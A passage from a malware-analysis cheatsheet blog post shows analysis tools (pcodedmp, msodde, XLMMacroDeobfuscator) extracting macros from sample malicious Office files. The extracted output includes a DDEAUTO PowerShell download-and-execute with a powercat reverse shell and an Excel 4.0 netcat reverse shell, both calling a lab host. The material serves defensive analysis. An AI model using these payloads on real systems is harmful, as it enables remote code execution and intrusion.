+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ pcodedmp macro-sample.xls -d
+Processing file: macro-sample.xls
+===============================================================================
+Module streams:
+_VBA_PROJECT_CUR/VBA/ThisWorkbook - 1275 bytes
+Line #0:
+	FuncDefn (Private Sub Workbook_Open())
+Line #1:
+	ArgsCall (Call) userAldiLoadr 0x0000 
+Line #2:
+	Ld xlSheetVisible 
+	Ld Sheet3 
+&lt;---snip---&gt;
+Line #4:
+	Ld xl3DAreaStacked 
+	MemStWith LineStyle 
+Line #5:
+Line #6:
+	EndWith 
+Line #7:
+Line #8:
+	StartWithExpr 
+	Ld xlEdgeRight 
+	Ld Selection 
+	ArgsMemLd Borders 0x0001
+&lt;---snip---&gt;
+Line #20:
+	FuncDefn (Sub Maceo8())    
+</pre></table></code></div></div><h2 id="dde-attack">DDE attack</h2><p>Use <strong>msodde</strong> to detect and extract DDE/DDEAUTO links from MS Office documents, RTF and CSV</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ msodde DDE-attack.docx 
+msodde 0.55 - http://decalage.info/python/oletools
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/oletools/issues
+
+Opening file: DDE-attack.docx
+DDE Links:
+ DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.5.128/powercat.ps1');powercat -c 192.168.5.128 -p 1111 -e cmd
+</pre></table></code></div></div><h2 id="excel-40-macros">Excel 4.0 macros</h2><p><strong>XLMMacroDeobfuscator</strong> can be used to decode obfuscated XLM macros (also known as Excel 4.0 macros)</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ xlmdeobfuscator -f excel4macro.xls 
+pywin32 is not installed (only is required if you want to use MS Excel)
+
+          _        _______
+|\     /|( \      (       )
+( \   / )| (      | () () |
+ \ (_) / | |      | || || |
+  ) _ (  | |      | |(_)| |
+ / ( ) \ | |      | |   | |
+( /   \ )| (____/\| )   ( |
+|/     \|(_______/|/     \|
+   ______   _______  _______  ______   _______           _______  _______  _______ _________ _______  _______
+  (  __  \ (  ____ \(  ___  )(  ___ \ (  ____ \|\     /|(  ____ \(  ____ \(  ___  )\__   __/(  ___  )(  ____ )
+  | (  \  )| (    \/| (   ) || (   ) )| (    \/| )   ( || (    \/| (    \/| (   ) |   ) (   | (   ) || (    )|
+  | |   ) || (__    | |   | || (__/ / | (__    | |   | || (_____ | |      | (___) |   | |   | |   | || (____)|
+  | |   | ||  __)   | |   | ||  __ (  |  __)   | |   | |(_____  )| |      |  ___  |   | |   | |   | ||     __)
+  | |   ) || (      | |   | || (  \ \ | (      | |   | |      ) || |      | (   ) |   | |   | |   | || (\ (
+  | (__/  )| (____/\| (___) || )___) )| )      | (___) |/\____) || (____/\| )   ( |   | |   | (___) || ) \ \__
+  (______/ (_______/(_______)|/ \___/ |/       (_______)\_______)(_______/|/     \|   )_(   (_______)|/   \__/
+
+    
+XLMMacroDeobfuscator(v 0.1.4) - https://github.com/DissectMalware/XLMMacroDeobfuscator
+
+File: /home/remnux/Desktop/excel4macro.xls
+
+Unencrypted xls file
+
+[Loading Cells]
+[Starting Deobfuscation]
+There is no entry point, please specify a cell address to start
+Example: Sheet1!A1
+Macro1!A1
+CELL:A1        , PartialEvaluation   , EXEC("nc -nv 192.168.5.128 1111 -e cmd.exe")
+CELL:A2        , PartialEvaluation   , RETURN()
+[END of Deobfuscation]
+time elapsed: 5.669408082962036
+</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/note/'>Note</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malicious-document/" class="post-tag no-text-decoration" >Malicious Document</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Malicious Document: Cheatsheet and Note - ~/FareedFauzi&url=https://fareedfauzi.github.io/posts/Maldoc-Cheatsheet/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Malicious Document: Cheatsheet and Note - ~/FareedFauzi&u=https://fareedfauzi.github.io/posts/Maldoc-Cheatsheet/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Malicious Document: Cheatsheet and Note - ~/FareedFauzi&url=https://fareedfauzi.github.io/posts/Maldoc-Cheatsheet/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Malware-dev-analysis/">Malware 101: Develop and Analyze our own malware</a><li><a href="/posts/Understanding-Powershell/">Powershell: Understanding the complexity behind it</a><li><a href="/posts/Deobfuscate-Powershell/">Powershell script: An easy way to deobfuscate it!</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/fileless/">Fileless</a> <a class="post-tag" href="/tags/powershell/">Powershell</a> <a class="post-tag" href="/tags/malicious-document/">Malicious Document</a> <a class="post-tag" href="/tags/malware-analysis/">Malware Analysis</a> <a class="post-tag" href="/tags/malware-development/">Malware Development</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Understanding-Powershell/"><div class="card-body"> <span class="timeago small" > May 11, 2020 <i class="unloaded">2020-05-11T08:06:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Powershell: Understanding the complexity behind it</h3><div class="text-muted small"><p> PowerShell attacks are currently the popular weapon of alternative for several of those attacks as a result of it provides variety of techniques for bypassing existing security. Not least of all, t...</p></div></div></a></div><div class="card"> <a href="/posts/Deobfuscate-Powershell/"><div class="card-body"> <span class="timeago small" > Feb 6 <i class="unloaded">2021-02-06T08:06:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Powershell script: An easy way to deobfuscate it!</h3><div class="text-muted small"><p> I came across a fileless malware called Lemon-Duck crypto miner during our (my officemate and I) investigation on suspicious communication in our client network. This malware completely leveraging ...</p></div></div></a></div><div class="card"> <a href="/posts/Malware-dev-analysis/"><div class="card-body"> <span class="timeago small" > Sep 20 <i class="unloaded">2021-09-20T08:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Malware 101: Develop and Analyze our own malware</h3><div class="text-muted small"><p> In this post, we’ll learn together how to write a basic malware program that does a reverse shell connection (using shellcode) and analyze our own compiled malware. We’ll play around with C code us...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Understanding-Powershell/" class="btn btn-outline-primary"><p>Powershell: Understanding the complexity behind it</p></a> <a href="/posts/Deobfuscate-Powershell/" class="btn btn-outline-primary"><p>Powershell script: An easy way to deobfuscate it!</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/0xfareed">fareedfauzi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/fileless/">Fileless</a> <a class="post-tag" href="/tags/powershell/">Powershell</a> <a class="post-tag" href="/tags/malicious-document/">Malicious Document</a> <a class="post-tag" href="/tags/malware-analysis/">Malware Analysis</a> <a class="post-tag" href="/tags/malware-development/">Malware Development</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://fareedfauzi.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id="></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); </script>
